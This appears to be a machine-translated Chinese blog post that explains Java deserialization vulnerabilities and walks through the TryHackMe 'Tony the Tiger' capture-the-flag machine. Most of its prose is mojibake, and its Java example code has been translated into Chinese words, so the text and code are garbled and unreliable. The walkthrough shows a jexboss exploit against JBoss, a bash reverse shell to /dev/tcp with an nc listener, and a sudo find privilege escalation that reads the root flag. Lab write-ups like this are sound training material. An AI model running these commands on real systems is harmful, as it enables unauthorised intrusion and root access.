# JAVA åºåˆ—åŒ–æ¼æ´ç»¼åˆæŒ‡å—

> åŸæ–‡ï¼š<https://infosecwriteups.com/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64?source=collection_archive---------0----------------------->

> **TLDR:** è¿™ä¸ªåšå®¢æ˜¯ä¸ºäº†å…¨é¢äº†è§£ **java åºåˆ—åŒ–æ”»å‡»**ï¼Œå®ƒåŒ…æ‹¬ CerealCTF-LinuxV2 æˆ–æ‰˜å°¼è€è™ boot2root æœºå™¨æ¼”ç»ƒã€‚

ä»€ä¹ˆæ˜¯ JAVA ä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–

JAVA ä¸­çš„å¯¹è±¡

Java æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ‰€ä»¥å®ƒåŒ…æ‹¬â€œå¯¹è±¡â€çš„æ¦‚å¿µã€‚

â€œå¯¹è±¡â€æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„åŸºæœ¬å•ä½ï¼Œä»£è¡¨ç°å®ç”Ÿæ´»ä¸­çš„å®ä½“ã€‚ä¸€ä¸ªå…¸å‹çš„ Java ç¨‹åºä¼šåˆ›å»ºè®¸å¤šå¯¹è±¡ï¼Œå¦‚ä½ æ‰€çŸ¥ï¼Œè¿™äº›å¯¹è±¡é€šè¿‡è°ƒç”¨æ–¹æ³•è¿›è¡Œäº¤äº’ã€‚

å®ƒåŒ…æ‹¬

1.  **çŠ¶æ€**:ç”¨ç‰©ä½“çš„å±æ€§æ¥è¡¨ç¤ºã€‚å®ƒè¿˜åæ˜ äº†å¯¹è±¡çš„å±æ€§ã€‚
2.  **è¡Œä¸º**:ç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•æ¥è¡¨ç°ã€‚å®ƒè¿˜åæ˜ äº†ä¸€ä¸ªå¯¹è±¡å¯¹å…¶ä»–å¯¹è±¡çš„å“åº”ã€‚
3.  **èº«ä»½**:ç»™ä¸€ä¸ªå¯¹è±¡ä¸€ä¸ªå”¯ä¸€çš„åå­—ï¼Œä½¿ä¸€ä¸ªå¯¹è±¡èƒ½å¤Ÿä¸å…¶ä»–å¯¹è±¡äº¤äº’ã€‚

å…³äºç‰©ä½“çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒ[https://geeksforgeeks.org/classes-objects-java/](http://geeksforgeeks.org/classes-objects-java/)

> ä»€ä¹ˆæ˜¯å­—èŠ‚æµ

**Java å­—èŠ‚æµ**ç”¨äºæ‰§è¡Œ 8 ä½**å­—èŠ‚**çš„è¾“å…¥å’Œè¾“å‡º

å­—èŠ‚æµé€å­—èŠ‚(8 ä½)å¤„ç†æ•°æ®ã€‚ä¾‹å¦‚ï¼ŒFileInputStream ç”¨äºä»æºè¯»å–ï¼ŒFileOutputStream ç”¨äºå†™å…¥ç›®æ ‡

![](img/a60f0c49ed13352a4fb141568c91429c.png)![](img/811bfe7223fc3c7af71f180a53d6b2f2.png)

> ä»€ä¹ˆæ˜¯ JAVA ä¸­çš„åºåˆ—åŒ–

æŠ½è±¡çš„åºåˆ—åŒ–æ˜¯å°†â€œå¯¹è±¡â€è½¬æ¢æˆ java å­—èŠ‚æµçš„è¿‡ç¨‹ï¼Œå¯ä»¥å­˜å‚¨åœ¨æ–‡ä»¶ã€æ•°æ®åº“å’Œ/æˆ–ç½‘ç»œä¸­ä¾›ä»¥åä½¿ç”¨

ä¸ºäº†ä½¿ Java å¯¹è±¡å¯åºåˆ—åŒ–ï¼Œæˆ‘ä»¬å®ç°äº† **java.io.Serializable** æ¥å£ã€‚
Object output stream ç±»åŒ…å«ç”¨äºåºåˆ—åŒ–å¯¹è±¡çš„ **writeObject()** æ–¹æ³•ã€‚

åªæœ‰é‚£äº›å®ç°äº† **java.io.Serializable** æ¥å£çš„[ç±»](https://www.geeksforgeeks.org/classes-objects-java/)çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚

```
class A implements Serializable{

// B also implements Serializable
// interface.
B ob=new B();  
}
```

æ›´å¤šä¿¡æ¯è¯·å‚è€ƒ-[https://www.geeksforgeeks.org/serialization-in-java/](https://www.geeksforgeeks.org/serialization-in-java/)

> ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–

ååºåˆ—åŒ–æ˜¯å°†å…ˆå‰åºåˆ—åŒ–çš„å¯¹è±¡é‡æ–°æ„é€ å›å…¶åŸå§‹å½¢å¼(å³å¯¹è±¡å®ä¾‹)çš„è¿‡ç¨‹ã€‚ååºåˆ—åŒ–è¿‡ç¨‹çš„è¾“å…¥æ˜¯æˆ‘ä»¬é€šè¿‡ç½‘ç»œçš„å¦ä¸€ç«¯è·å¾—çš„å­—èŠ‚æµï¼Œæˆ–è€…æˆ‘ä»¬åªæ˜¯ä»æ–‡ä»¶ç³»ç»Ÿ/æ•°æ®åº“ä¸­è¯»å–å®ƒ

å‡†ç¡®åœ°è¯´ï¼Œè¿™ä¸ªå­—èŠ‚æµ(æˆ–è€…è¯´åºåˆ—åŒ–æ•°æ®)åŒ…å«äº†è¢«åºåˆ—åŒ–è¿‡ç¨‹åºåˆ—åŒ–çš„å®ä¾‹çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯åŒ…æ‹¬ç±»çš„å…ƒæ•°æ®ã€å®ä¾‹å­—æ®µçš„ç±»å‹ä¿¡æ¯ä»¥åŠå®ä¾‹å­—æ®µçš„å€¼ã€‚å½“å¯¹è±¡è¢«é‡æ–°æ„é€ å›æ–°çš„å¯¹è±¡å®ä¾‹æ—¶ï¼Œéœ€è¦ç›¸åŒçš„ä¿¡æ¯ã€‚å½“ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒJVM ä»å­—èŠ‚æµä¸­è¯»å–å®ƒçš„ç±»å…ƒæ•°æ®ï¼ŒæŒ‡å®šä¸€ä¸ªå¯¹è±¡çš„ç±»æ˜¯å®ç°â€œå¯åºåˆ—åŒ–â€è¿˜æ˜¯â€œå¯å¤–éƒ¨åŒ–â€æ¥å£ã€‚

![](img/60f65c2a090f41af6b1c3c818fbe8c96.png)

> ç°åœ¨ä¸¤è€…æ˜¯å¦‚ä½•ååŒå·¥ä½œçš„

![](img/b9a8c9e0b8291f8445480556025f1e91.png)![](img/aaa3a6011f0cec7bd9d62b3e13853267.png)![](img/a1368251b92477556e80d6174de6d44a.png)

> **JAVA ååºåˆ—åŒ–æ”»å‡»**

å½“åº”ç”¨ç¨‹åº**å¯¹æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„**å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šå‡ºç° **Java ååºåˆ—åŒ–**é—®é¢˜ã€‚

åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œåºåˆ—åŒ–çš„ Java å¯¹è±¡ä½¿æ”»å‡»è€…èƒ½å¤Ÿå®Œå…¨è¿œç¨‹æ§åˆ¶åº”ç”¨æœåŠ¡å™¨ã€‚

å¤æ‚çš„ç°ä»£ç³»ç»Ÿæ˜¯é«˜åº¦åˆ†å¸ƒå¼çš„ã€‚ç”±äºç»„ä»¶ä¹‹é—´ç›¸äº’é€šä¿¡å¹¶å…±äº«ä¿¡æ¯(ä¾‹å¦‚åœ¨æœåŠ¡ä¹‹é—´ç§»åŠ¨æ•°æ®ã€å­˜å‚¨ä¿¡æ¯ç­‰)ï¼Œæœ¬æœºäºŒè¿›åˆ¶æ ¼å¼å¹¶ä¸ç†æƒ³ã€‚ç®€è€Œè¨€ä¹‹ï¼Œåºåˆ—åŒ–æ˜¯å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²(ascii å­—ç¬¦)çš„è¿‡ç¨‹ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥ä½¿ç”¨æ ‡å‡†åè®®è¿›è¡Œä¼ è¾“ã€‚

åºåˆ—åŒ–æ“ä½œåœ¨åŒ…æ‹¬ APIã€å¾®æœåŠ¡å’Œå®¢æˆ·ç«¯ MVC çš„æ¶æ„ä¸­éå¸¸å¸¸è§ã€‚å½“è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ•°æ®æ˜¯å¯ä¿¡çš„(åœ¨ç³»ç»Ÿçš„æ§åˆ¶ä¸‹)æ—¶ï¼Œæ²¡æœ‰é£é™©ã€‚

ä½†æ˜¯ï¼Œå½“ç”¨æˆ·å¯ä»¥ä¿®æ”¹è¾“å…¥æ—¶ï¼Œç»“æœæ˜¯ä¸å¯ä¿¡çš„ååºåˆ—åŒ–æ¼æ´ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»å­—ç¬¦ä¸²åˆ°äºŒè¿›åˆ¶çš„è½¬æ¢(ååºåˆ—åŒ–)æ˜¯ä¸€ä¸ªå®¹æ˜“è¢«æ»¥ç”¨çš„å¾®å¦™æ“ä½œã€‚å…¸å‹çš„æ“ä½œè¿‡ç¨‹æ˜¯å‡†å¤‡ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œå…¶ä¸­åŒ…æ‹¬åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿œç¨‹æ‰§è¡Œä»£ç ã€‚é€šå¸¸ï¼Œç›®æ ‡æ˜¯è¿è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

W é—®é¢˜æ¥äº†

åºåˆ—åŒ–(ååºåˆ—åŒ–)çš„ä½¿ç”¨æœ¬èº«ä¸æ˜¯é—®é¢˜ã€‚å½“ç”¨æˆ·(æ”»å‡»è€…)å¯ä»¥æ§åˆ¶è¢«ååºåˆ—åŒ–çš„æ•°æ®æ—¶ï¼Œä¾‹å¦‚ï¼Œå¦‚æœæ•°æ®å¯ä»¥é€šè¿‡ç½‘ç»œè¿æ¥ä¼ é€’ç»™ååºåˆ—åŒ–ä¾‹ç¨‹ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚å¦‚æœæ”»å‡»è€…æ§åˆ¶äº†è¢«ååºåˆ—åŒ–çš„æ•°æ®ï¼Œé‚£ä¹ˆä»–ä»¬å°±å¯¹å†…å­˜ä¸­çš„å˜é‡å’Œç¨‹åºå¯¹è±¡æœ‰ä¸€å®šçš„å½±å“ã€‚éšåï¼Œå¦‚æœæ”»å‡»è€…å¯ä»¥å½±å“å†…å­˜ä¸­çš„å˜é‡å’Œç¨‹åºå¯¹è±¡ï¼Œé‚£ä¹ˆä»–ä»¬å°±å¯ä»¥å½±å“ä½¿ç”¨è¿™äº›å˜é‡å’Œå¯¹è±¡çš„ä»£ç æµã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ª Java ååºåˆ—åŒ–çš„ä¾‹å­:

å…¬å¼€è¯¾ç¨‹{

å…¬å…±å­—ç¬¦ä¸²ç”¨æˆ·åï¼›

å…¬å…±å¸ƒå°”ç™»å½•ï¼›

å…¬å…± void load session(byte[]session data)å¼•å‘å¼‚å¸¸{

ObjectInputStream ois = new ObjectInputStream(new bytearrayiputstream(session data))ï¼›

this . username = ois . read utf()ï¼›

this . loggedin = ois . read boolean()ï¼›

}

}

*'loadSession'* æ–¹æ³•æ¥å—ä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œå¹¶å°†è¯¥å­—èŠ‚æ•°ç»„ä¸­çš„å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼ååºåˆ—åŒ–åˆ°å¯¹è±¡çš„ *'username'* å’Œ *'loggedIn'* å±æ€§ä¸­ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ä¼ é€’ç»™è¯¥æ–¹æ³•çš„*â€˜session dataâ€™*å­—èŠ‚æ•°ç»„çš„å†…å®¹ï¼Œé‚£ä¹ˆä»–ä»¬å°±å¯ä»¥æ§åˆ¶è¿™äº›å¯¹è±¡å±æ€§ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•ä½¿ç”¨æ­¤ä¼šè¯å¯¹è±¡çš„ç¤ºä¾‹:

å…¬å…±ç±» UserSettingsController {

public void update password(Session Sessionï¼ŒString newPassword)å¼•å‘å¼‚å¸¸{

if(session.loggedIn) {

user model . update password(session . usernameï¼Œnew password)ï¼›

}å¦åˆ™{

æŠ›å‡ºæ–°å¼‚å¸¸(â€œé”™è¯¯:ç”¨æˆ·æœªç™»å½•ã€‚â€);

}

}

}

å¦‚æœä¼šè¯å·²ç™»å½•ï¼Œåˆ™ç”¨æˆ·åå­˜å‚¨åœ¨ä¼šè¯ä¸­çš„ç”¨æˆ·çš„å¯†ç å°†æ›´æ–°ä¸ºç»™å®šå€¼ã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„*â€˜POP Gadgetâ€™*çš„ä¾‹å­ï¼Œä¸€æ®µæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è±¡çš„å±æ€§æ¥æ§åˆ¶çš„ä»£ç ã€‚

ç°åœ¨è®©æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥åˆ©ç”¨æ‰˜å°¼è€è™æœºã€‚

> æ‰˜å°¼è€è™æœºå™¨æ¼”ç»ƒ

ç°åœ¨æˆ‘ä»¬å°†å±•ç¤ºè¿™ä¸€æ¼æ´æœ‰å¤šå±é™©ï¼Œå…¶å½±å“èŒƒå›´ä» DOS åˆ° RCEã€‚

è¿™æ˜¯æˆ‘ä»¬å°†åœ¨æœ¬æ¼”ç»ƒä¸­ä½¿ç”¨çš„è®¡ç®—æœºçš„é“¾æ¥

é“¾æ¥-[https://tryhackme.com/room/tonythetiger](https://tryhackme.com/room/tonythetiger)

![](img/6377af519fc211351e7053561bdbd401.png)![](img/d8c318d583b267c33cf170b0f4769877.png)

å¥½çš„ï¼Œè®©æˆ‘ä»¬å¯¹å®ƒè¿›è¡Œ nmap æ‰«æ

`nmap --top-ports=50 -sV [machine-ip]`

![](img/a079c6ff2934fda15216b23542068cdd.png)

`nmap -p- [machine-ip]`

![](img/ccee0e140ad6e5e13762ee9ccf5eb0da.png)

å¥½çš„ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ä»åšå®¢ä¸Šè·å–æ‰˜å°¼çš„æ——å¸œï¼Œåšå®¢åœ¨ç«¯å£ 80 ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å»é‚£é‡Œ

![](img/fb39108b0b87b012fcb85efe92356542.png)

åœ¨åšå®¢ä¸Šå››å¤„æ¼«æ¸¸åï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å›½æ——ï¼Œä½†åœ¨â€œéœœèŠ±â€åšå®¢ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ˜¯ä¸€å¹…å›¾åƒ

![](img/a2bd4957bab01127a86b856a52c73c94.png)

æ‰€ä»¥æˆ‘é¦–å…ˆæƒ³åˆ°çš„æ˜¯æ–¯ç¼‡æ ¼ã€‚

è®©æˆ‘ä»¬ä¸‹è½½å›¾åƒå¹¶åˆ†æå®ƒï¼Œæ£€æŸ¥å›¾åƒä¸­éšè—æ•°æ®çš„ç¬¬ä¸€ä»¶äº‹æ˜¯æŸ¥çœ‹å®ƒçš„åå…­è¿›åˆ¶æ•°æ®

ä¸‹è½½å›¾åƒåï¼Œè®©æˆ‘ä»¬ä½¿ç”¨`strings` æ¥æ£€æŸ¥å®ƒçš„åå…­è¿›åˆ¶æ•°æ®

`strings be2sOV9.jpg`

æ»šåŠ¨åˆ°æœ€åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ——å¸œ

![](img/43d9ac96121b55f5f4ab6f80d48a0570.png)

é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œä¸¤ä¸ªæ——æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œæ²¡æœ‰ä¸¤ä¸ªæ——æ˜¯ä¸€æ ·çš„ã€‚å®ƒåªæ˜¯åœ¨åå…­è¿›åˆ¶æ•°æ®ä¸­å‡ºç°äº†ä¸¤æ¬¡

ç°åœ¨è®©æˆ‘ä»¬åšä¸»è¦çš„äº‹æƒ…ï¼Œåˆ©ç”¨ java åºåˆ—åŒ–ç¼ºé™·ã€‚

æˆ‘ä»¬çœ‹åˆ° Apache Tomcat/Coyote JSP engine 1.1 æ­£åœ¨ç«¯å£ 8080 ä¸Šè¿è¡Œï¼Œè®©æˆ‘ä»¬è®¿é—®å®ƒ

![](img/e46b810cd284666e42093b5296d386ee.png)

å¥½çš„ï¼Œå®ƒè¿è¡Œ JBOSS ä½œä¸ºå‰ç«¯åº”ç”¨ç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œåˆ©ç”¨ java åºåˆ—åŒ–é”™è¯¯

è®©è°·æ­Œ jboss åˆ©ç”¨

![](img/90a7ad956ebf1c2ca0755e5f2ad9a75f.png)

å¥½çš„ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ªé“¾æ¥ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª github åº“

![](img/b91e3859e31d17f31010d6df182064cd.png)

è®©æˆ‘ä»¬éµå¾ªå›è´­åè®®ä¸­ç»™å‡ºçš„è¿™äº›æ­¥éª¤

![](img/64313c11ecb70452a2ec46a9284bc930.png)

å®Œæˆä¸Šè¿°æ‰€æœ‰æ­¥éª¤åï¼Œè®©æˆ‘ä»¬è¿è¡Œæœ€åä¸€ä¸ªå‘½ä»¤(è¯·æŒ‰ç…§ä¸Šé¢ç»™å‡ºçš„æ–¹æ³•è®¾ç½®æ¼æ´ï¼Œå¹¶è¿è¡Œæ‰€æœ‰å‘½ä»¤ä½¿å…¶å·¥ä½œ)

`python2 jexboss.py -host [http://[machine-ip]:8080](http://[machine-ip]:8080)`

![](img/dd9cb3f464e38eecc7a87fbfe125b04b.png)

è¿è¡Œä¸Šé¢çš„å‘½ä»¤åï¼Œæˆ‘ä»¬å°†å¾—åˆ°

![](img/fd6e82e5506eac9d5da7c63aa973f317.png)

ä¼™è®¡ä»¬ï¼Œæœ€åˆæˆ‘çš„æ¼æ´åˆ©ç”¨å¤±è´¥äº†ï¼Œä½†å†æ¬¡è¿è¡Œåï¼Œå®ƒçš„å·¥ä½œï¼Œæœ‰æ—¶ä½ éœ€è¦è¿è¡Œæ¼æ´åˆ©ç”¨ä¸¤ä¸‰æ¬¡ï¼Œå¦‚æœå®ƒåœ¨ç¬¬ä¸€æ¬¡ä¸å·¥ä½œ

ç°åœ¨è®©æˆ‘ä»¬åœ¨æˆ‘åœ¨è¿™é‡Œé€‰æ‹©çš„ä»»ä½•æƒ³è¦çš„ç«¯å£ 1234 ä¸Šè¿è¡Œæˆ‘ä»¬çš„ netcat ç›‘å¬å™¨

`nc -lvp 1234`

è®©æˆ‘ä»¬è¿è¡Œ`/bin/bash -i > /dev/tcp/[your-ip]/[nc-listening-port] 0>&1 2>&1`

![](img/83a4753524eb72a6307fb5cfcbafd313.png)![](img/09c0198a54b04245557d535df7c1136a.png)

æˆ‘ä»¬åœ¨ netcat ç›‘å¬å™¨ä¸Šè¿›è¡Œä¼šè¯

![](img/86af6f7c3fe265837d4b3fc66ae579b0.png)

å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬æ˜¯ç”¨æˆ·â€œcmnatic â€,æˆ‘ä»¬éœ€è¦â€œjbossâ€ç”¨æˆ·æ ‡å¿—ï¼Œå› æ­¤è®©æˆ‘ä»¬è½¬åˆ°ä¸»ç›®å½•å¹¶æŸ¥çœ‹æƒé™

![](img/d03a6121ffce70b483ab416352ca2c1c.png)

å¥½çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥ jboss ä¸»ç›®å½•

è®©æˆ‘ä»¬å» jboss ç›®å½•

åœ¨è¿›å…¥ jboss ç”¨æˆ·ç›®å½•åï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªæ–‡ä»¶â€œæ³¨é‡Šâ€,è®©æˆ‘ä»¬é€šè¯»ä¸€ä¸‹`cat`

![](img/d47eca69fbb7a1790a310e37f03a79a3.png)![](img/5f28f34a37233055c6238f91867eb26c.png)

ç­”å¯¹äº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ç”¨æˆ·â€œjbossâ€çš„å¯†ç ï¼Œè®©æˆ‘ä»¬æŠŠè‡ªå·±ä»â€œcmnaticâ€æ”¹æˆâ€œjbossâ€

åœ¨æ›´æ”¹ç”¨æˆ·ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ python ç”Ÿæˆ pty shellï¼Œä»¥ä¾¿è¿è¡Œ`su`å‘½ä»¤ã€‚

`python -c 'import pty;pty.spawn("/bin/bash")'`

é‚£å°±è·‘

`su jboss`

![](img/76cf7a045aa0354bbcfe28c75d9bd0bd.png)

å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ° jboss ç”¨æˆ·çš„æ ‡å¿—

è®©æˆ‘ä»¬çœ‹çœ‹ jboss ç”¨æˆ·ç›®å½•ä¸­çš„éšè—æ–‡ä»¶

`ls -la`

![](img/8f675d30787c71c7888266b10758a589.png)

æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡æœ¬æ–‡ä»¶ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹

![](img/69bcf8daf9927acd66d53521699699b6.png)

æˆ‘ä»¬åœ¨é‚£é‡Œæ‹¿åˆ°äº†æ——å­

ç°åœ¨æˆ‘ä»¬éœ€è¦å¾—åˆ°è¶…çº§ç”¨æˆ·çš„æ ¹æ ‡å¿—ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ä½œä¸ºç”¨æˆ·â€œjboss â€,æˆ‘ä»¬å¯ä»¥ç”¨è¶…çº§ç”¨æˆ·æƒé™åœ¨ç³»ç»Ÿä¸Šè¿è¡Œä»€ä¹ˆå‘½ä»¤

`sudo -l`

![](img/835845b5d30b7e887faffeb02ae07ff8.png)

æˆ‘ä»¬å¯ä»¥ root cool èº«ä»½è¿è¡Œ`find`å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥æå‡æƒé™

ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒé»‘å®¢åšå®¢ä¸­å…³äºä½¿ç”¨`find`å‘½ä»¤æå‡æƒé™çš„æ–‡ç« 

link-[https://www . hacking articles . in/Linux-for-pentester-find-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)

è¿è¡Œæ­¤å‘½ä»¤æŸ¥çœ‹æ ¹æ ‡å¿—

`touch raj`

`sudo find raj -exec cat /root/root.txt \;`

![](img/76475e6c611dd82fc2ebe189644b003b.png)

å¥½å§ï¼Œä½†è¿™ä¸æ˜¯ä¸€ä¸ªæ ‡å¿—(è™½ç„¶åœ¨æŒ‘æˆ˜ä¸­æåˆ°æœ€åä¸€ä¸ªæ ‡å¿—ä¸æ˜¯ THM{}æ ¼å¼ï¼Œä½†è¿™æ˜¯ base64 ç¼–ç ï¼Œè€Œä¸æ˜¯ä»»ä½•æ–‡æœ¬)

è®©æˆ‘ä»¬è§£ç è¿™ä¸ª base64 æ•°æ®

![](img/b392af62fa2efa70e6f8d8b8910e1467.png)

å¥½äº†ï¼Œæˆ‘ä»¬åˆå¾—åˆ°äº†ä¸€ä¸ªæ•£åˆ—å€¼ï¼Œçœ‹èµ·æ¥åƒ md5ï¼Œè®©æˆ‘ä»¬ç”¨ç ´è§£ç«™æ¥ç ´è§£å®ƒ

![](img/7a0e6319582832c889bc3d9e49c9574e.png)

ç§å•Šã€‚ï¼æˆ‘ä»¬æ‹¿åˆ°äº†æˆ‘ä»¬çš„æ ¹æ——

ä½œè€…:infosec_boy

[](https://www.linkedin.com/in/anubhav-mandarwal-318952186/) [## anubhav mandarwal -å‰¯å¨èƒç ”ç©¶å‘˜-ç½‘ç»œ| LinkedIn

### æŸ¥çœ‹ anubhav mandarwal åœ¨ä¸–ç•Œä¸Šæœ€å¤§çš„èŒä¸šç¤¾åŒº LinkedIn ä¸Šçš„ä¸ªäººèµ„æ–™ã€‚anubhav æœ‰ 3 ä»½å·¥ä½œåˆ—åœ¨â€¦

www.linkedin.com](https://www.linkedin.com/in/anubhav-mandarwal-318952186/) [](https://twitter.com/infosec_boy) [## é˜¿åŠªå·´å¤«Â·æ›¼å¾·ç“¦å°”

### anubhav mandarwal çš„æœ€æ–°æ¨æ–‡(@infosec_boy)ã€‚ä¸€ä¸ªå–œæ¬¢æ‘†å¼„æœºå™¨å’Œæ•æ‰è™«å­çš„äººğŸ’»â€¦

twitter.com](https://twitter.com/infosec_boy)  [## ç™»å½•* Instagram

### æ¬¢è¿å›åˆ° Instagramã€‚ç™»å½•æŸ¥çœ‹æ‚¨çš„æœ‹å‹ã€å®¶äººå’Œå…´è¶£çˆ±å¥½æ•æ‰å’Œåˆ†äº«äº†ä»€ä¹ˆâ€¦

www.instagram.com](https://www.instagram.com/infosec_boy/)